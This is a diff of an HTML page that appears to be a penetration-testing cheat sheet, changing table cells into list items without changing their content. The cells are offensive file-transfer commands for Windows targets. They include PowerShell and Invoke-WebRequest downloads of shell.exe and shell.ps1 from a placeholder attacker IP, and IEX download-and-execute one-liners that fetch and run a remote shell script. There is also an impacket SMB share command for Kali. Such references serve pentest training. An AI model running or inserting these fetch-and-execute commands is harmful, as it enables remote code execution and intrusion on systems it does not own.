@@ -512,11 +512,19 @@
     <table>
         <tr>
             <td>Download file</td>
-            <td>invoke-webrequest -Uri http://&lt;ip address&gt;/shell.exe [-OutFile &lt;file&gt;]<br>IWR -Uri &lt;url&gt; [-OutFile &lt;file&gt;]</td>
+            <td>
+                <li>invoke-webrequest -Uri http://&lt;ip address&gt;/shell.exe [-OutFile &lt;file&gt;]</li>
+                <li>IWR -Uri &lt;url&gt; [-OutFile &lt;file&gt;]</li>
+            </td>
         </tr>
         <tr>
             <td>Download file with Powershell</td>
-            <td>powershell -c &quot;(new-object System.Net.WebClient).DownloadFile(&#039;http://&lt;ip address&gt;/wget.exe&#039;,&#039;C:\&lt;output directory and file name&gt;&#039;)<br>powershell  &quot;(new-object System.Net.WebClient).DownloadFile(&#039;http://&lt;ip address&gt;/wget.exe&#039;,&#039;C:\&lt;output directory and file name&gt;&#039;)&quot;<br>(new-object System.Net.WebClient).DownloadFile(&#039;http://&lt;ip address&gt;/shell.ps1&#039;,&lt;output directory and file name&gt;&#039;)<br>wget &lt;url&gt; -outfile &lt;file name&gt;</td>
+            <td>
+                <li>powershell -c &quot;(new-object System.Net.WebClient).DownloadFile(&#039;http://&lt;ip address&gt;/wget.exe&#039;,&#039;C:\&lt;output directory and file name&gt;&#039;)</li>
+                <li>powershell  &quot;(new-object System.Net.WebClient).DownloadFile(&#039;http://&lt;ip address&gt;/wget.exe&#039;,&#039;C:\&lt;output directory and file name&gt;&#039;)&quot;</li>
+                <li>(new-object System.Net.WebClient).DownloadFile(&#039;http://&lt;ip address&gt;/shell.ps1&#039;,&lt;output directory and file name&gt;&#039;)</li>
+                <li>wget &lt;url&gt; -outfile &lt;file name&gt;</li>
+            </td>
         </tr>
         <tr>
             <td>Download file with cmd</td>
@@ -524,7 +532,12 @@
         </tr>
         <tr>
             <td>Download and run powershell script</td>
-            <td>powershell -c &quot;IEX(New-Object Net.WebClient).downloadString(&#039;http://&amp;lt;ip address&amp;gt;/shell.ps1&#039;)&quot;<br>powershell &quot;IEX(New-Object Net.WebClient).downloadString(&#039;http://&amp;lt;ip address&amp;gt;/shell.ps1&#039;)&quot;<br>IEX(IWR http:/&amp;lt;ip address&amp;gt;/shell.ps1 -UseBasicParsing)<br>IEX(IWR(&lt;url&gt;))</td>
+            <td>
+                <li>powershell -c &quot;IEX(New-Object Net.WebClient).downloadString(&#039;http://&amp;lt;ip address&amp;gt;/shell.ps1&#039;)&quot;</li>
+                <li>powershell &quot;IEX(New-Object Net.WebClient).downloadString(&#039;http://&amp;lt;ip address&amp;gt;/shell.ps1&#039;)&quot;</li>
+                <li>IEX(IWR http:/&amp;lt;ip address&amp;gt;/shell.ps1 -UseBasicParsing)</li>
+                <li>IEX(IWR(&lt;url&gt;))</li>
+            </td>
         </tr>
         <tr>
             <td>SMB</td>
@@ -534,7 +547,7 @@
                     <tr>
                         <td>Start SMB share on Kali</td>
                         <td>
-                            impacket-smbserver &lt;Share Name&gt; &lt;Directory of Share&gt; -smb2support -user &lt;Username to connect to share&gt; -password &lt;Password to connect to share&gt; 
+                            <li>impacket-smbserver &lt;Share Name&gt; &lt;Directory of Share&gt; -smb2support -user &lt;Username to connect to share&gt; -password &lt;Password to connect to share&gt;</li>
                             <li>Some machines do not work with smb2support.  Other machines require it.</li>
                             <li>Credentials optional.  Can skip next step if not used.</li>
                         </td>
